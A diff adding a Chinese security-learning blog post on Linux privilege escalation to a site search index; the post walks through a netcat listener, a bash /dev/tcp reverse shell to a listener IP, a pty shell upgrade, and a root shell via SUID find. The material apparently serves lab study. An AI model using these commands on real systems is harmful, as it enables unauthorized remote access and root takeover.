@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>linux提权</title>
+      <link href="/2024/10/11/1%20linux%E7%BB%B4%E6%9D%83%E5%92%8C%E6%8F%90%E6%9D%83/"/>
+      <url>/2024/10/11/1%20linux%E7%BB%B4%E6%9D%83%E5%92%8C%E6%8F%90%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-将meterpreter获得的权限，反弹到kail上。"><a href="#1-将meterpreter获得的权限，反弹到kail上。" class="headerlink" title="1 将meterpreter获得的权限，反弹到kail上。"></a>1 将meterpreter获得的权限，反弹到kail上。</h3><h4 id="1-1-kaill监听端口"><a href="#1-1-kaill监听端口" class="headerlink" title="1.1 kaill监听端口"></a>1.1 kaill监听端口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp <span class="number">4444</span> <span class="comment">//nc是监听软件，4444是监听端口</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584076577-8dc5a9af-4a47-4ab9-b2d0-cbd67a4a686d.png"></p><h4 id="1-2-meterpreter获取权限后，将权限反弹出来"><a href="#1-2-meterpreter获取权限后，将权限反弹出来" class="headerlink" title="1.2 meterpreter获取权限后，将权限反弹出来"></a>1.2 meterpreter获取权限后，将权限反弹出来</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.2.96/4444 &lt;&amp;1&#x27;</span> <span class="comment">//将权限反弹到指定ip地址</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584181405-f6228c06-0936-47c3-904a-4707b55ced4d.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584268726-aee52496-2f22-412a-8d9e-61f9e4e09560.png"></p><h4 id="1-3-稳固自己的权限"><a href="#1-3-稳固自己的权限" class="headerlink" title="1.3 稳固自己的权限"></a>1.3 稳固自己的权限</h4><p>Python 代码 <code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 是用来创建一个伪终端（pseudo-terminal）并启动一个新的 bash shell。下面是这段代码的具体意思：</p><ol><li><code>python -c &#39;...&#39;</code>：这是在命令行中运行 Python 代码的方式。<code>-c</code> 选项表示要执行后面引号中的代码。</li><li><code>import pty</code>：这行代码导入了 Python 的 <code>pty</code> 模块。<code>pty</code> 模块提供了与伪终端相关的功能。</li><li><code>pty.spawn(&quot;/bin/bash&quot;)</code>：这是 <code>pty</code> 模块中的一个函数。<code>spawn</code> 函数启动一个新的子进程，并将其连接到一个伪终端。这里，<code>&quot;/bin/bash&quot;</code> 是要启动的程序，即 bash shell。</li></ol><p>这些命令用于配置和恢复终端的行为。下面是对每个命令的具体解释：</p><ol><li><code>stty raw -echo</code>：<ul><li><code>stty</code> 是一个用于配置终端属性的命令。</li><li><code>raw</code> 模式将终端设置为原始模式。在这种模式下，输入的字符不会被处理（例如，不会进行行缓冲、字符转换等），而是直接传递给程序。这种模式常用于需要对每个输入字符进行精细控制的场景。</li><li><code>-echo</code> 选项禁用字符回显。也就是说，输入的字符不会显示在终端上，这在一些需要隐藏输入内容的操作中很有用（例如，输入密码）。</li></ul></li><li><code>fg</code>：<ul><li><code>fg</code> 是用来将后台进程恢复到前台的命令。在你启动了一个进程并将其放到后台后（比如使用 <code>Ctrl+Z</code>），可以用 <code>fg</code> 命令将它带回前台。</li><li>在这个上下文中，<code>fg</code> 可能是为了将之前被放到后台的进程（比如一个被暂停的 shell）恢复到前台，以便继续交互。</li></ul></li><li><code>reset</code>：<ul><li><code>reset</code> 命令用于重置终端到默认状态。这包括恢复终端的各种设置（如输入模式、屏幕显示等），清除任何可能的错误状态，确保终端的正常操作。</li><li>这个命令常用于当终端的显示或输入出现异常时，例如在终端的模式被不小心更改后，使用 <code>reset</code> 来恢复到正常状态。</li></ul></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>结合在一起，<code>stty raw -echo; fg; reset</code> 的目的可能是：</p><ul><li>将终端切换到原始模式并禁用回显，以进行某种特殊的交互。</li><li>使用 <code>fg</code> 恢复一个之前被放到后台的进程（如一个 shell）到前台。</li><li>使用 <code>reset</code> 来重置终端，以确保所有的终端设置恢复到默认状态。</li></ul><p>这种组合可能用于调试或恢复终端环境，尤其是在交互性和终端配置被破坏或修改的情况下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>   <span class="comment">//先记作固定用法</span></span><br><span class="line">ctrl +z </span><br><span class="line">stty raw -echo;fg;reset</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584463153-c472d14f-6d2e-4b8d-8174-a369c8043590.png"></p><h3 id="2-提升自己的权限"><a href="#2-提升自己的权限" class="headerlink" title="2 提升自己的权限"></a>2 提升自己的权限</h3><h4 id="2-1-移动到tmp目录，因为tmp目录有权限。并创建一个文件"><a href="#2-1-移动到tmp目录，因为tmp目录有权限。并创建一个文件" class="headerlink" title="2.1 移动到tmp目录，因为tmp目录有权限。并创建一个文件"></a>2.1 移动到tmp目录，因为tmp目录有权限。并创建一个文件</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch <span class="number">1</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584639753-87608500-4599-4b9f-9ea3-a684498c3a6d.png"></p><h4 id="2-2-寻找可以提权的命令"><a href="#2-2-寻找可以提权的命令" class="headerlink" title="2.2 寻找可以提权的命令"></a>2.2 寻找可以提权的命令</h4><ul><li><code>**-perm -4000**</code>：这个选项用于查找具有特定权限的文件。<code>4000</code> 是一个八进制数，表示设置了 <code>setuid</code> 位（也称为 “set user ID” 位）的文件。<code>setuid</code> 位允许文件在执行时以文件所有者的权限运行，而不是执行者的权限。<code>-</code> 表示要匹配具有该权限位的文件，<code>4000</code> 表示具体的权限位。</li><li><code>**-print**</code>：这个选项用于打印找到的文件路径。</li><li><code>**2&gt;/dev/null**</code>：这是一个重定向操作。<code>2&gt;</code> 用于将标准错误输出（文件描述符 2）重定向到 <code>/dev/null</code>，一个特殊的文件，丢弃所有写入的数据。这样做可以将错误信息（如权限问题或不可访问的目录）隐藏起来，不显示在终端上。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722585283689-67ed8977-1087-471d-ac49-dbbb76fa842e.png"></p><h4 id="2-3-进行提权"><a href="#2-3-进行提权" class="headerlink" title="2.3 进行提权"></a>2.3 进行提权</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -name <span class="number">1</span> -exec <span class="string">&quot;/bin/sh&quot;</span>  \;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1722584836795-b45026c4-9849-4082-a2cf-b7fefe17e3fa.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+            <tag> 维权 </tag>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>内网穿透</title>
       <link href="/2024/08/14/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%88%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%89/"/>
       <url>/2024/08/14/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%88%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%89/</url>
